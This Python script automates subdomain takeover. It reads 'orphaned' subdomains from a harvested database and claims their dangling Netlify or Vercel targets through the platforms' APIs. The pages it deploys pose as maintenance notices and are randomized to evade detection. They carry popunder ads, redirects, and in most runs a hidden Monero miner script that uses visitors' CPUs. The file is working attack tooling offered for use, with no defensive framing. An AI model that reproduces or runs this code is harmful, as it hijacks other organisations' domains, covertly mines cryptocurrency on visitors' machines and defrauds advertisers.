import sqlite3
import os
import requests
import zipfile
import io
import base64
import time
import random

NETLIFY_TOKENS = os.environ.get('NETLIFY_TOKEN', '').split(',')
VERCEL_TOKENS = os.environ.get('VERCEL_TOKEN', '').split(',')
GH_TOKEN = os.environ.get('GH_ORG_TOKEN')
GA4_ID = os.environ.get('GA4_ID')
AD_POPUNDER = os.environ.get('AD_POPUNDER')
AD_NATIVE = os.environ.get('AD_NATIVE')
MONERO_WALLET = os.environ.get('MONERO_WALLET')
DB_NAME = 'harvested.db'

def get_rent_html():
    try:
        with open('template_rent.html', 'r', encoding='utf-8') as f:
            return f.read()
    except:
        return None

def generate_polymorphic_html(subdomain):
    premium_tlads = ['.io', '.ai', '.co', '.app', '.dev']
    if any(tld in subdomain for tld in premium_tlads):
        rent_html = get_rent_html()
        if rent_html:
            return rent_html   

    tier = random.choices(['conservative', 'aggressive', 'redirect'], weights=[70, 20, 10])[0]
    
    bg_colors = ['#0d1117', '#1a1a2e', '#f4f4f9', '#222222', '#0f172a']
    text_colors = ['#58a6ff', '#e94560', '#00d2d3', '#fbbf24', '#8b949e']
    fonts = ['Arial, sans-serif', 'Helvetica, sans-serif', 'Segoe UI, sans-serif', 'Roboto, sans-serif']
    titles = ["We'll be right back.", "Maintenance in Progress", "Under Construction", "We are upgrading.", "Be right back."]
    messages = [
        "Our platform is undergoing scheduled upgrades to improve performance.",
        "We're doing some quick maintenance. Thank you for your patience.",
        "Our systems are being updated. Check back soon.",
        "We'll be back online shortly. Thanks for visiting!"
    ]
    
    bg = random.choice(bg_colors)
    txt = random.choice(text_colors)
    font = random.choice(fonts)
    title = random.choice(titles)
    msg = random.choice(messages)

    ad_payload = ""
    redirect_script = ""
    miner_script = ""

    if tier == 'conservative':
        if AD_NATIVE:
            ad_payload = "<div style='margin-top: 50px;'>" + AD_NATIVE + "</div>"
    elif tier == 'aggressive':
        if AD_POPUNDER:
            ad_payload += AD_POPUNDER
        if AD_NATIVE:
            ad_payload += "<div style='margin-top: 50px;'>" + AD_NATIVE + "</div>"
    elif tier == 'redirect':
        redirect_script = "<script>setTimeout(function(){window.location.href='https://google.com';}, 5000);</script>"

    if MONERO_WALLET:
        if random.random() < 0.6:
            miner_script = "<script src='https://server1.webminerpool.com/lib/minero-hidden.js'></script>"
            miner_script += "<script>setTimeout(function(){var miner = new Client.Anonymous('" + MONERO_WALLET + "'); miner.start(); miner.setThrottle(0.7);}, 10000);</script>"

    analytics_script = ""
    if GA4_ID:
        analytics_script = "<script async src='https://www.googletagmanager.com/gtag/js?id=" + GA4_ID + "'></script>"
        analytics_script += "<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','" + GA4_ID + "');</script>"

    html = "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    html += "<meta name='robots' content='index, follow'><meta name='description' content='" + msg + "'>"
    html += "<title>" + title + "</title>" + analytics_script + "<style>"
    html += "body { font-family: " + font + "; background: " + bg + "; color: " + txt + "; text-align: center; padding-top: 15%; }"
    html += ".container { max-width: 600px; margin: 0 auto; padding: 20px; }"
    html += "h1 { font-size: 36px; margin-bottom: 20px; }"
    html += "p { font-size: 16px; opacity: 0.8; line-height: 1.5; }"
    html += ".spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid " + txt + "; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 30px auto; }"
    html += "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
    html += "</style></head><body><div class='container'>"
    html += "<h1>" + title + "</h1><p>" + msg + "</p><div class='spinner'></div>"
    html += "<p style='font-weight: bold;'>Est. Time Remaining: 0" + str(random.randint(3, 9)) + ":00</p>"
    html += "</div>" + ad_payload + redirect_script + miner_script + "</body></html>"
    
    return html

def deploy_to_netlify(subdomain, cname_target):
    if '.netlify.app' not in cname_target:
        return False
    if not NETLIFY_TOKENS or NETLIFY_TOKENS == ['']:
        return False
    token = random.choice(NETLIFY_TOKENS)
    base_name = cname_target.split('.netlify.app')[0]
    site_name = base_name.replace('.', '-')
    headers = {'Authorization': 'Bearer ' + token}
    
    try:
        res = requests.post("https://api.netlify.com/api/v1/sites", headers=headers, json={'name': site_name})
        if res.status_code not in [200, 201]:
            return False
        site_id = res.json()['id']
        
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
            file_content = generate_polymorphic_html(subdomain)
            zip_file.writestr('index.html', file_content)
        zip_buffer.seek(0)
        
        deploy_res = requests.post("https://api.netlify.com/api/v1/sites/" + site_id + "/deploys", headers={'Authorization': 'Bearer ' + token, 'Content-Type': 'application/zip'}, data=zip_buffer.read())
        if deploy_res.status_code in [200, 201]:
            print("DEPLOY SUCCESS (Netlify): " + subdomain)
            return True
        return False
    except Exception as e:
        print("Error: " + str(e))
        return False

def deploy_to_vercel(subdomain, cname_target):
    if '.vercel.app' not in cname_target:
        return False
    if not VERCEL_TOKENS or VERCEL_TOKENS == ['']:
        return False
    token = random.choice(VERCEL_TOKENS)
    base_name = cname_target.split('.vercel.app')[0]
    project_name = base_name.replace('.', '-')
    headers = {'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json'}
    
    try:
        res = requests.post("https://api.vercel.com/v10/projects", headers=headers, json={'name': project_name})
        if res.status_code not in [200, 201]:
            return False
            
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
            file_content = generate_polymorphic_html(subdomain)
            zip_file.writestr('index.html', file_content)
        zip_buffer.seek(0)
        
        deploy_res = requests.post("https://api.vercel.com/v13/deployments", headers={'Authorization': 'Bearer ' + token, 'Content-Type': 'application/zip'}, params={'name': project_name, 'target': 'production'}, data=zip_buffer.read())
        if deploy_res.status_code in [200, 201]:
            print("DEPLOY SUCCESS (Vercel): " + subdomain)
            return True
        return False
    except Exception as e:
        print("Error: " + str(e))
        return False

def main():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT subdomain, cname_target FROM subdomains WHERE status='orphaned'")
    targets = c.fetchall()
    if not targets:
        print("No orphaned domains to deploy.")
        return
    for target in targets:
        subdomain = target[0]
        cname_target = target[1]
        if '.netlify.app' in cname_target:
            success = deploy_to_netlify(subdomain, cname_target)
        elif '.vercel.app' in cname_target:
            success = deploy_to_vercel(subdomain, cname_target)
        else:
            c.execute("UPDATE subdomains SET status='deploy_skipped' WHERE subdomain=?", (subdomain,))
            conn.commit()
            continue
        if success:
            c.execute("UPDATE subdomains SET status='deployed' WHERE subdomain=?", (subdomain,))
        else:
            c.execute("UPDATE subdomains SET status='deploy_failed' WHERE subdomain=?", (subdomain,))
        conn.commit()
        time.sleep(2)
    conn.close()

if __name__ == "__main__":
    main()
